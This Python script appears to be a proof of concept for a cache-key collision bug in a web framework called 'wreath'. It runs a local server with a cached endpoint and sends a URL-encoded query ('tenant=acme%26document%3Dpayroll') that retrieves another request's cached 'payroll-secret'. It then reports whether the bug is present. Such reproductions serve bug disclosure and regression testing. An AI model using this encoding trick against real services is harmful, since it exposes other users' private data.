from __future__ import annotations

import asyncio
import socket
import threading

from wreath import Wreath
from wreath._codecs import parse_qs
from wreath.reactor import metal_event_loop
from wreath.response_cache import cached
from wreath.server import Server, ServerConfig


def _exchange(
    port: int,
    target: bytes,
    output: list[bytes],
    loop: asyncio.AbstractEventLoop,
    finished: asyncio.Event,
) -> None:
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=5) as client:
            client.sendall(
                b"GET " + target + b" HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"
            )
            response = bytearray()
            while part := client.recv(4096):
                response += part
            output.append(bytes(response))
    finally:
        loop.call_soon_threadsafe(finished.set)


async def _drive(server: Server, port: int) -> list[bytes]:
    responses: list[bytes] = []
    loop = asyncio.get_running_loop()
    targets = (
        b"/document?tenant=acme&document=payroll",
        b"/document?tenant=acme%26document%3Dpayroll",
    )
    for target in targets:
        finished = asyncio.Event()
        thread = threading.Thread(
            target=_exchange,
            args=(port, target, responses, loop, finished),
        )
        thread.start()
        await finished.wait()
        thread.join()
    await server.close()
    return responses


def main() -> int:
    app = Wreath()

    @app.get("/document")
    @cached(ttl=60, query_params=("tenant", "document"))
    async def document(request) -> str:
        query = dict(parse_qs(request.query_string, 0))
        if query == {"tenant": "acme", "document": "payroll"}:
            return "payroll-secret"
        return "not-found"

    loop = metal_event_loop(gc_mode="stock")
    try:
        config = ServerConfig(
            host="127.0.0.1",
            port=0,
            protocols=("http/1.1",),
            lifespan="off",
        )
        server = Server(app, config, loop)
        loop.run_until_complete(server._start(ssl=None, tls=None))
        port = server.sockets[0].getsockname()[1]
        responses = loop.run_until_complete(_drive(server, port))
    finally:
        loop.close()

    bodies = [response.partition(b"\r\n\r\n")[2] for response in responses]
    for body in bodies:
        print(body.decode("utf-8", "replace"))
    vulnerable = bodies == [b"payroll-secret", b"payroll-secret"]
    print("VULNERABLE: colliding query received cached secret" if vulnerable else "not vulnerable")
    return 0 if vulnerable else 1


if __name__ == "__main__":
    raise SystemExit(main())
